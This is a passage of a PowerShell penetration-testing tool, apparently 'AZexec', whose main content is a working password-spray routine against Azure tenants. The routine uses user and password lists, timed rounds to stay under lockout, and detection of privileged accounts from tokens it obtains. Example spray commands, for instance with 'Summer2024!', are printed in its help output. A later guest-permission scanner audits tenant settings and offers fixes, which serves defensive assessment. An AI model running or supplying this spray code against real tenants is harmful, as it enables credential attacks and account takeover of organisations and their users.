        # Load usernames
        $usernames = @()

        # Single username
        if ($Username) {
            if ($Username -notlike "*@*") {
                $Username = "$Username@$Domain"
            }
            $usernames += $Username
        }

        # Load usernames from file
        if ($UserFile) {
            if (-not (Test-Path $UserFile)) {
                Write-ColorOutput -Message "[!] User file not found: $UserFile" -Color "Red"
            } else {
                try {
                    $fileContent = Get-Content $UserFile -ErrorAction Stop
                    foreach ($line in $fileContent) {
                        $line = $line.Trim()
                        if ($line -and $line -notlike "#*") {
                            # Format: username:password or just username
                            if ($line -like "*:*") {
                                $parts = $line -split ":", 2
                                $user = $parts[0].Trim()
                            } else {
                                $user = $line
                            }

                            if ($user -notlike "*@*") {
                                $user = "$user@$Domain"
                            }

                            $usernames += $user
                        }
                    }
                    Write-ColorOutput -Message "[*] Loaded $($usernames.Count) username(s) from file" -Color "Green"
                } catch {
                    Write-ColorOutput -Message "[!] Failed to read user file: $_" -Color "Red"
                }
            }
        }

        # Load passwords
        $passwords = @()

        # Single password from -Password parameter
        if ($Password) {
            $passwords += $Password
        }

        # Load passwords from file
        if ($PasswordFile) {
            if (-not (Test-Path $PasswordFile)) {
                Write-ColorOutput -Message "[!] Password file not found: $PasswordFile" -Color "Red"
            } else {
                try {
                    $passFileContent = Get-Content $PasswordFile -ErrorAction Stop
                    foreach ($passLine in $passFileContent) {
                        $passLine = $passLine.Trim()
                        if ($passLine -and $passLine -notlike "#*") {
                            $passwords += $passLine
                        }
                    }
                    Write-ColorOutput -Message "[*] Loaded $($passwords.Count) password(s) from file" -Color "Green"
                } catch {
                    Write-ColorOutput -Message "[!] Failed to read password file: $_" -Color "Red"
                }
            }
        }

        # Default to empty password if none provided
        if ($passwords.Count -eq 0) {
            $passwords += ""
        }

        # Show OPSEC warnings for spray mode
        if ($SprayMode -or $passwords.Count -gt 1) {
            Show-SprayOPSECWarnings -UserCount $usernames.Count -PasswordCount $passwords.Count -Delay $Delay -ContinueOnSuccess $ContinueOnSuccess -NoBruteforce $NoBruteforce
        }

        # Build credential combinations based on mode
        $credentialsToTest = @()
        $results = @()

        if ($NoBruteforce) {
            # Linear pairing mode (user1:pass1, user2:pass2, ...)
            Write-ColorOutput -Message "[*] Mode: Linear pairing (--no-bruteforce)" -Color "Cyan"
            $pairCount = [Math]::Min($usernames.Count, $passwords.Count)
            for ($i = 0; $i -lt $pairCount; $i++) {
                $credentialsToTest += @{
                    Username = $usernames[$i]
                    Password = $passwords[$i]
                    PasswordIndex = $i
                }
            }
            if ($usernames.Count -ne $passwords.Count) {
                Write-ColorOutput -Message "[!] Warning: User count ($($usernames.Count)) != Password count ($($passwords.Count))" -Color "Yellow"
                Write-ColorOutput -Message "[*] Only $pairCount pairs will be tested" -Color "Yellow"
            }
        } else {
            # Matrix mode - test all combinations, grouped by password (for delays)
            Write-ColorOutput -Message "[*] Mode: Matrix (all user/password combinations)" -Color "Cyan"
            $passwordIndex = 0
            foreach ($pass in $passwords) {
                foreach ($user in $usernames) {
                    $credentialsToTest += @{
                        Username = $user
                        Password = $pass
                        PasswordIndex = $passwordIndex
                    }
                }
                $passwordIndex++
            }
        }

        Write-ColorOutput -Message "[*] Testing $($credentialsToTest.Count) credential combination(s)...`n" -Color "Yellow"

        $foundValidCreds = $false
        $currentPasswordIndex = -1
        $startTime = Get-Date

        foreach ($cred in $credentialsToTest) {
            # Check if we should stop (found valid creds and ContinueOnSuccess is false)
            if ($foundValidCreds -and -not $ContinueOnSuccess) {
                Write-ColorOutput -Message "`n[*] Stopping - valid credentials found (use -ContinueOnSuccess to keep testing)" -Color "Yellow"
                break
            }

            # Apply delay between password rounds (only in matrix mode)
            if (-not $NoBruteforce -and $Delay -gt 0 -and $cred.PasswordIndex -ne $currentPasswordIndex -and $currentPasswordIndex -ne -1) {
                Write-ColorOutput -Message "`n[*] Password round complete. Waiting $Delay seconds before next round..." -Color "Yellow"
                Write-ColorOutput -Message "[*] Next password round starting at: $((Get-Date).AddSeconds($Delay).ToString('HH:mm:ss'))" -Color "DarkGray"
                Start-Sleep -Seconds $Delay
                Write-ColorOutput -Message "[*] Resuming spray attack...`n" -Color "Yellow"
            }
            $currentPasswordIndex = $cred.PasswordIndex

            $authResult = Test-GuestAuthentication -Username $cred.Username -Password $cred.Password -TenantId $Domain

            $displayUser = $cred.Username
            if ($displayUser.Length -gt 35) {
                $displayUser = $displayUser.Substring(0, 32) + "..."
            }

            $passDisplay = if ($cred.Password -eq "") { "(empty)" } else { "(password)" }

            if ($authResult.Success) {
                $foundValidCreds = $true

                # Check for privileged roles if we have a token (automatic Pwn3d! equivalent)
                $privIndicator = ""
                $privLevel = $null
                $privDisplay = $null
                $privRoles = @()

                if ($authResult.AccessToken) {
                    # Query for privilege level using the obtained token
                    $privResult = Get-UserPrivilegeLevel -AccessToken $authResult.AccessToken
                    if ($privResult.Success -and $privResult.PrivilegeDisplay) {
                        $privIndicator = " ($($privResult.PrivilegeDisplay))"
                        $privLevel = $privResult.PrivilegeLevel
                        $privDisplay = $privResult.PrivilegeDisplay
                        $privRoles = $privResult.Roles
                    }
                }

                # Determine output color based on privilege level
                $outputColor = "Green"
                if ($privLevel -eq "CRITICAL") { $outputColor = "Red" }
                elseif ($privLevel -eq "HIGH") { $outputColor = "Yellow" }

                if ($authResult.MFARequired) {
                    # Valid creds but MFA needed - still check for admin status
                    # Note: Can't check privileges without a token, but credentials ARE valid
                    Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - MFA REQUIRED") -Color "Yellow"
                } elseif ($authResult.ConsentRequired) {
                    # Valid creds but consent needed
                    Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - CONSENT REQUIRED") -Color "Yellow"
                } else {
                    # Full success - we got a token! Show privilege indicator if admin
                    Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] SUCCESS! Got access token$privIndicator") -Color $outputColor
                }

                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $true
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = ($null -ne $authResult.AccessToken)
                    PrivilegeLevel = $privLevel
                    PrivilegeDisplay = $privDisplay
                    PrivilegedRoles = $privRoles
                }
            } else {
                # Authentication failed
                $errorMsg = switch ($authResult.ErrorCode) {
                    "INVALID_CREDENTIALS" { "[-] Invalid credentials" }
                    "USER_NOT_FOUND" { "[-] User not found" }
                    "ACCOUNT_LOCKED" { "[!] ACCOUNT LOCKED" }
                    "ACCOUNT_DISABLED" { "[-] Account disabled" }
                    "PASSWORD_EXPIRED" { "[!] PASSWORD EXPIRED (valid user)" }
                    "ROPC_DISABLED" { "[!] ROPC disabled (try device code flow)" }
                    "APP_NOT_FOUND" { "[-] Application not found in tenant" }
                    default { "[-] Failed: $($authResult.ErrorCode)" }
                }

                $errorColor = if ($authResult.AccountLocked -or $authResult.PasswordExpired) { "Yellow" } else { "DarkGray" }

                Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + $errorMsg) -Color $errorColor

                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $false
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = $false
                }
            }

            # Small delay between individual attempts to avoid rate limiting
            Start-Sleep -Milliseconds 100
        }

        $endTime = Get-Date
        $duration = $endTime - $startTime

        # Enhanced Summary
        $successCount = ($results | Where-Object { $_.Success }).Count
        $mfaCount = ($results | Where-Object { $_.MFARequired }).Count
        $tokenCount = ($results | Where-Object { $_.HasToken }).Count
        $lockedCount = ($results | Where-Object { $_.ErrorCode -eq "ACCOUNT_LOCKED" }).Count
        $expiredCount = ($results | Where-Object { $_.ErrorCode -eq "PASSWORD_EXPIRED" }).Count
        $notFoundCount = ($results | Where-Object { $_.ErrorCode -eq "USER_NOT_FOUND" }).Count
        $invalidCount = ($results | Where-Object { $_.ErrorCode -eq "INVALID_CREDENTIALS" }).Count

        Write-ColorOutput -Message "`n[*] ============================================" -Color "Yellow"
        Write-ColorOutput -Message "[*] PASSWORD SPRAY SUMMARY" -Color "Yellow"
        Write-ColorOutput -Message "[*] ============================================" -Color "Yellow"
        Write-ColorOutput -Message "    Duration:           $($duration.ToString('hh\:mm\:ss'))" -Color "Cyan"
        Write-ColorOutput -Message "    Total Tested:       $($results.Count)" -Color "Cyan"
        Write-ColorOutput -Message "    Unique Users:       $($usernames.Count)" -Color "Cyan"
        Write-ColorOutput -Message "    Passwords Tested:   $($passwords.Count)" -Color "Cyan"
        Write-ColorOutput -Message "" -Color "Yellow"
        Write-ColorOutput -Message "[*] Results:" -Color "Yellow"
        Write-ColorOutput -Message "    Valid Credentials:  $successCount" -Color $(if ($successCount -gt 0) { "Green" } else { "DarkGray" })
        Write-ColorOutput -Message "    Got Access Token:   $tokenCount" -Color $(if ($tokenCount -gt 0) { "Green" } else { "DarkGray" })
        Write-ColorOutput -Message "    MFA Required:       $mfaCount" -Color $(if ($mfaCount -gt 0) { "Yellow" } else { "DarkGray" })
        Write-ColorOutput -Message "    Password Expired:   $expiredCount" -Color $(if ($expiredCount -gt 0) { "Yellow" } else { "DarkGray" })
        Write-ColorOutput -Message "    Accounts Locked:    $lockedCount" -Color $(if ($lockedCount -gt 0) { "Red" } else { "DarkGray" })
        Write-ColorOutput -Message "    Users Not Found:    $notFoundCount" -Color "DarkGray"
        Write-ColorOutput -Message "    Invalid Creds:      $invalidCount" -Color "DarkGray"
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()

                $exportData = [PSCustomObject]@{
                    Domain = $Domain
                    TenantConfig = $guestConfig
                    SprayConfig = @{
                        Mode = if ($NoBruteforce) { "Linear" } else { "Matrix" }
                        ContinueOnSuccess = $ContinueOnSuccess
                        DelayBetweenRounds = $Delay
                        UniqueUsers = $usernames.Count
                        PasswordsTested = $passwords.Count
                    }
                    AuthResults = $results
                    Summary = @{
                        Duration = $duration.ToString('hh\:mm\:ss')
                        TotalTested = $results.Count
                        ValidCredentials = $successCount
                        GotAccessToken = $tokenCount
                        MFARequired = $mfaCount
                        PasswordExpired = $expiredCount
                        LockedAccounts = $lockedCount
                        UsersNotFound = $notFoundCount
                        InvalidCredentials = $invalidCount
                    }
                }

                if ($extension -eq ".csv") {
                    $results | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } elseif ($extension -eq ".html") {
                    # Generate HTML report
                    $htmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>AZexec Password Spray Report - $Domain</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; }
        h2 { color: #ff6b6b; margin-top: 30px; }
        .summary-box { background: #16213e; padding: 20px; border-radius: 8px; margin: 20px 0; }
        .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .stat { background: #0f3460; padding: 15px; border-radius: 5px; text-align: center; }
        .stat-value { font-size: 2em; font-weight: bold; color: #00d4ff; }
        .stat-label { color: #aaa; margin-top: 5px; }
        .success { color: #4ade80; }
        .warning { color: #fbbf24; }
        .danger { color: #f87171; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #0f3460; color: #00d4ff; }
        tr:hover { background: #16213e; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.8em; }
        .badge-success { background: #166534; color: #4ade80; }
        .badge-warning { background: #854d0e; color: #fbbf24; }
        .badge-danger { background: #991b1b; color: #f87171; }
        .badge-info { background: #1e40af; color: #60a5fa; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AZexec Password Spray Report</h1>
        <p>Target: <strong>$Domain</strong> | Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>

        <div class="summary-box">
            <h2>Summary</h2>
            <div class="summary-grid">
                <div class="stat">
                    <div class="stat-value">$($results.Count)</div>
                    <div class="stat-label">Total Attempts</div>
                </div>
                <div class="stat">
                    <div class="stat-value success">$successCount</div>
                    <div class="stat-label">Valid Credentials</div>
                </div>
                <div class="stat">
                    <div class="stat-value success">$tokenCount</div>
                    <div class="stat-label">Access Tokens</div>
                </div>
                <div class="stat">
                    <div class="stat-value warning">$mfaCount</div>
                    <div class="stat-label">MFA Required</div>
                </div>
                <div class="stat">
                    <div class="stat-value danger">$lockedCount</div>
                    <div class="stat-label">Locked Accounts</div>
                </div>
                <div class="stat">
                    <div class="stat-value">$($duration.ToString('hh\:mm\:ss'))</div>
                    <div class="stat-label">Duration</div>
                </div>
            </div>
        </div>

        <h2>Attack Configuration</h2>
        <table>
            <tr><td>Mode</td><td>$(if ($NoBruteforce) { 'Linear Pairing' } else { 'Matrix' })</td></tr>
            <tr><td>Unique Users</td><td>$($usernames.Count)</td></tr>
            <tr><td>Passwords Tested</td><td>$($passwords.Count)</td></tr>
            <tr><td>Delay Between Rounds</td><td>$(if ($Delay -gt 0) { "$Delay seconds" } else { 'None' })</td></tr>
            <tr><td>Continue On Success</td><td>$(if ($ContinueOnSuccess) { 'Yes' } else { 'No' })</td></tr>
        </table>

        <h2>Results</h2>
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Status</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>
"@
                    foreach ($r in $results) {
                        $statusBadge = if ($r.Success -and $r.HasToken) {
                            '<span class="badge badge-success">SUCCESS</span>'
                        } elseif ($r.Success -and $r.MFARequired) {
                            '<span class="badge badge-warning">MFA REQUIRED</span>'
                        } elseif ($r.ErrorCode -eq "ACCOUNT_LOCKED") {
                            '<span class="badge badge-danger">LOCKED</span>'
                        } elseif ($r.ErrorCode -eq "PASSWORD_EXPIRED") {
                            '<span class="badge badge-warning">EXPIRED</span>'
                        } else {
                            '<span class="badge badge-info">FAILED</span>'
                        }

                        $details = $r.ErrorCode
                        if ($r.HasToken) { $details = "Got access token" }
                        elseif ($r.MFARequired) { $details = "Valid credentials, MFA required" }
                        elseif ($r.ConsentRequired) { $details = "Valid credentials, consent required" }

                        $htmlContent += @"
                <tr>
                    <td>$($r.Username)</td>
                    <td>$statusBadge</td>
                    <td>$details</td>
                </tr>
"@
                    }

                    $htmlContent += @"
            </tbody>
        </table>
    </div>
</body>
</html>
"@
                    $htmlContent | Out-File -FilePath $ExportPath -Force
                } else {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }

                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }

        # If we got valid credentials, offer to enumerate as guest
        $validCreds = $results | Where-Object { $_.Success -and -not $_.MFARequired -and $_.HasToken }
        if ($validCreds) {
            Write-ColorOutput -Message "`n[*] Valid credentials found! You can now enumerate as a guest user:" -Color "Green"
            Write-ColorOutput -Message "    .\azx.ps1 hosts   # Enumerate devices" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 groups  # Enumerate groups" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 pass-pol # Check password policies`n" -Color "Cyan"
        }

    } else {
        # No credentials provided - just show what's accessible without auth
        Write-ColorOutput -Message "[*] No credentials provided. Testing unauthenticated access..." -Color "Yellow"
        Write-ColorOutput -Message "[*] To test guest authentication, use:" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user@domain.com -Password 'pass'" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user -Password ''  # Empty password test" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -UserFile users.txt -Password 'Summer2024!'" -Color "Cyan"
        Write-ColorOutput -Message "" -Color "Yellow"
        Write-ColorOutput -Message "[*] Enhanced Password Spray (NetExec-style):" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 spray -Domain $Domain -UserFile users.txt -Password 'Summer2024!'" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 spray -Domain $Domain -UserFile users.txt -PasswordFile passwords.txt -Delay 1800" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 spray -Domain $Domain -UserFile users.txt -Password 'Pass123' -ContinueOnSuccess" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 spray -Domain $Domain -UserFile users.txt -PasswordFile pass.txt -NoBruteforce" -Color "Cyan"
        Write-ColorOutput -Message "`n[*] File format (one per line):" -Color "Yellow"
        Write-ColorOutput -Message "    username                 # Uses -Password for all" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com          # Full UPN" -Color "DarkGray"
    }
    
    $completionMsg = if ($SprayMode) { "[*] Password spray complete!" } else { "[*] Guest enumeration complete!" }
    Write-ColorOutput -Message $completionMsg -Color "Green"
}

# Helper function to test guest user permissions
function Test-GuestUserPermissions {
    param(
        [string]$TestType  # "Users", "Groups", "Devices", "Applications", "DirectoryRoles"
    )
    
    $result = [PSCustomObject]@{
        TestType = $TestType
        Accessible = $false
        ItemCount = 0
        Error = $null
        PermissionLevel = "None"
    }
    
    try {
        switch ($TestType) {
            "Users" {
                $users = Get-MgUser -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($users | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Groups" {
                $groups = Get-MgGroup -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($groups | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Devices" {
                $devices = Get-MgDevice -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($devices | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "Applications" {
                $apps = Get-MgApplication -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($apps | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
            "DirectoryRoles" {
                $roles = Get-MgDirectoryRole -Top 10 -ErrorAction Stop
                $result.Accessible = $true
                $result.ItemCount = ($roles | Measure-Object).Count
                $result.PermissionLevel = "Read"
            }
        }
    } catch {
        $result.Error = $_.Exception.Message
        $result.Accessible = $false
    }
    
    return $result
}


function Get-GuestPermissionLevel {
    try {
        $authPolicy = Get-MgPolicyAuthorizationPolicy -ErrorAction Stop
        $guestRoleId = $authPolicy.GuestUserRoleId
        
        # Map GuestUserRoleId to permission level
        # a0b1b346-4d3e-4e8b-98f8-753987be4970 = Guest user access (most permissive - default before 2018)
        # 10dae51f-b6af-4016-8d66-8c2a99b929b3 = Guest users have limited access to properties and memberships of directory objects (default 2018-2021)
        # 2af84b1e-32c8-42b7-82bc-daa82404023b = Guest user access is restricted to properties and memberships of their own directory objects (most restrictive - recommended)
        
        $permissionLevel = switch ($guestRoleId) {
            "a0b1b346-4d3e-4e8b-98f8-753987be4970" { "Same as member users (CRITICAL)" }
            "10dae51f-b6af-4016-8d66-8c2a99b929b3" { "Limited (MEDIUM)" }
            "2af84b1e-32c8-42b7-82bc-daa82404023b" { "Restricted (GOOD)" }
            default { "Unknown ($guestRoleId)" }
        }
        
        return [PSCustomObject]@{
            GuestUserRoleId = $guestRoleId
            PermissionLevel = $permissionLevel
            IsVulnerable = ($guestRoleId -eq "a0b1b346-4d3e-4e8b-98f8-753987be4970")
            IsRestricted = ($guestRoleId -eq "2af84b1e-32c8-42b7-82bc-daa82404023b")
            Success = $true
        }
    } catch {
        return [PSCustomObject]@{
            GuestUserRoleId = $null
            PermissionLevel = "Unknown"
            IsVulnerable = $false
            IsRestricted = $false
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

# Helper function to check external collaboration settings
function Get-ExternalCollaborationSettings {
    try {
        $authPolicy = Get-MgPolicyAuthorizationPolicy -ErrorAction Stop
        
        # Check if external users can be invited
        $allowInvites = $authPolicy.AllowInvitesFrom
        $allowedToInvite = $authPolicy.AllowedToSignUpEmailBasedSubscriptions
        
        return [PSCustomObject]@{
            AllowInvitesFrom = $allowInvites
            AllowEmailSubscriptions = $allowedToInvite
            BlockMsolPowerShell = $authPolicy.BlockMsolPowerShell
            DefaultUserRolePermissions = $authPolicy.DefaultUserRolePermissions
            Success = $true
        }
    } catch {
        return [PSCustomObject]@{
            AllowInvitesFrom = "Unknown"
            AllowEmailSubscriptions = $null
            BlockMsolPowerShell = $null
            DefaultUserRolePermissions = $null
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

function Invoke-GuestVulnScanEnumeration {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Guest User Vulnerability Scanner" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest-Vuln-Scan (Azure Null Session Security Assessment)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --check-null-session + security audit`n" -Color "Yellow"
    
    $scanResults = [PSCustomObject]@{
        Domain = $Domain
        ScanDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Phase1_Unauthenticated = @{}
        Phase2_Authenticated = @{}
        Vulnerabilities = @()
        RiskScore = 0
        Summary = @{}
    }
    
    # ============================================
    # PHASE 1: UNAUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 1: Unauthenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            # Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Try environment variable
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Try Graph context
            if (-not $detectedDomain) {
                try {
                    $context = Get-MgContext -ErrorAction SilentlyContinue
                    if ($context -and $context.Account -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from Graph context: $detectedDomain" -Color "Green"
                    }
                } catch {
                    # Silent
                }
            }
        } catch {
            # Silent catch
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Yellow"
            Write-ColorOutput -Message "[*] Skipping domain-specific unauthenticated checks" -Color "Yellow"
            Write-ColorOutput -Message "[*] Use -Domain parameter for full enumeration`n" -Color "DarkGray"
        }
    }
    
    $scanResults.Domain = $Domain
    
    # 1.1 Check if external collaboration is enabled (unauthenticated)
    if ($Domain) {
        Write-ColorOutput -Message "[*] Testing external collaboration configuration..." -Color "Yellow"
        
        $guestConfig = Test-GuestLoginEnabled -Domain $Domain
        $scanResults.Phase1_Unauthenticated.GuestConfiguration = $guestConfig
        
        if ($guestConfig.TenantExists) {
            Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists") -Color "Green"
            
            if ($guestConfig.AcceptsExternalUsers) {
                Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[!] External collaboration: ENABLED") -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "ExternalCollaboration"
                    Risk = "MEDIUM"
                    Description = "Tenant accepts external/guest users (B2B collaboration enabled)"
                    Recommendation = "Review guest user access policies and implement conditional access"
                }
                $scanResults.RiskScore += 30
            } else {
                Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External collaboration: Appears restricted") -Color "Green"
            }
            
            if ($guestConfig.IsFederated) {
                Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: $($guestConfig.FederationType)") -Color "Cyan"
            }
        } else {
            Write-ColorOutput -Message ("AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found") -Color "Red"
            return
        }
        
        Write-ColorOutput -Message ""
    }
    
    # ============================================
    # PHASE 2: AUTHENTICATED CHECKS (GUEST PERMISSIONS)
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 2: Authenticated Enumeration (Guest Permission Testing)" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Check if we can connect to Graph
    $graphConnected = $false
    $isGuest = $false
    $currentUser = $null
    
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        if ($context) {
            $graphConnected = $true
            $currentUser = $context.Account
            Write-ColorOutput -Message "[+] Using existing Graph connection: $currentUser" -Color "Green"
        }
    } catch {
        # Not connected yet
    }
    
    if (-not $graphConnected) {
        Write-ColorOutput -Message "[*] Attempting to connect to Microsoft Graph..." -Color "Yellow"
        try {
            # Request scopes needed for guest permission testing
            Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Device.Read.All","Application.Read.All","Directory.Read.All","Policy.Read.All" -ErrorAction Stop
            $context = Get-MgContext
            $graphConnected = $true
            $currentUser = $context.Account
            Write-ColorOutput -Message "[+] Connected as: $currentUser" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph" -Color "Yellow"
            Write-ColorOutput -Message "[*] Authenticated checks will be skipped" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    if ($graphConnected) {
        # Check if current user is a guest
        $isGuest = Test-IsGuestUser -UserPrincipalName $currentUser
        
        if ($isGuest) {
            Write-ColorOutput -Message "[!] GUEST USER DETECTED - Testing guest permission boundaries" -Color "Yellow"
            Write-ColorOutput -Message "[*] This simulates the 'Azure Null Session' attack scenario`n" -Color "Yellow"
        } else {
            Write-ColorOutput -Message "[*] MEMBER USER - Testing what guests could access" -Color "Cyan"
            Write-ColorOutput -Message "[*] Results show potential guest enumeration capabilities`n" -Color "Cyan"
        }
        
        $scanResults.Phase2_Authenticated.IsGuest = $isGuest
        $scanResults.Phase2_Authenticated.CurrentUser = $currentUser
        
        # 2.1 Get guest permission policy
        Write-ColorOutput -Message "[*] Checking guest permission policy..." -Color "Yellow"
        
        $guestPermPolicy = Get-GuestPermissionLevel
        $scanResults.Phase2_Authenticated.GuestPermissionPolicy = $guestPermPolicy
        
        if ($guestPermPolicy.Success) {
            $policyColor = if ($guestPermPolicy.IsVulnerable) { "Red" } elseif ($guestPermPolicy.IsRestricted) { "Green" } else { "Yellow" }
            Write-ColorOutput -Message "    [*] Guest Permission Level: $($guestPermPolicy.PermissionLevel)" -Color $policyColor
            
            if ($guestPermPolicy.IsVulnerable) {
                Write-ColorOutput -Message "    [!] CRITICAL: Guests have SAME permissions as members!" -Color "Red"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestPermissions"
                    Risk = "CRITICAL"
                    Description = "Guest users have same permissions as member users (GuestUserRoleId: a0b1b346-4d3e-4e8b-98f8-753987be4970)"
                    Recommendation = "Change to restricted mode: Set-MgPolicyAuthorizationPolicy -GuestUserRoleId '2af84b1e-32c8-42b7-82bc-daa82404023b'"
                }
                $scanResults.RiskScore += 50
            } elseif (-not $guestPermPolicy.IsRestricted) {
                Write-ColorOutput -Message "    [!] WARNING: Guest permissions are not fully restricted" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestPermissions"
                    Risk = "MEDIUM"
                    Description = "Guest users have limited but not fully restricted permissions"
                    Recommendation = "Consider restricting guest access to most restrictive level"
                }
                $scanResults.RiskScore += 20
            } else {
                Write-ColorOutput -Message "    [+] Guest permissions are properly restricted" -Color "Green"
            }
        } else {
            Write-ColorOutput -Message "    [!] Could not retrieve guest permission policy" -Color "Red"
        }
        
        # 2.2 Get external collaboration settings
        Write-ColorOutput -Message "`n[*] Checking external collaboration settings..." -Color "Yellow"
        
        $collabSettings = Get-ExternalCollaborationSettings
        $scanResults.Phase2_Authenticated.CollaborationSettings = $collabSettings
        
        if ($collabSettings.Success) {
            Write-ColorOutput -Message "    [*] Guest invitations allowed from: $($collabSettings.AllowInvitesFrom)" -Color "Cyan"
            
            if ($collabSettings.AllowInvitesFrom -eq "everyone") {
                Write-ColorOutput -Message "    [!] WARNING: All users can invite guests" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestInvitations"
                    Risk = "LOW"
                    Description = "All users in the organization can invite guest users"
                    Recommendation = "Restrict guest invitations to admins only"
                }
                $scanResults.RiskScore += 10
            }
        }
        
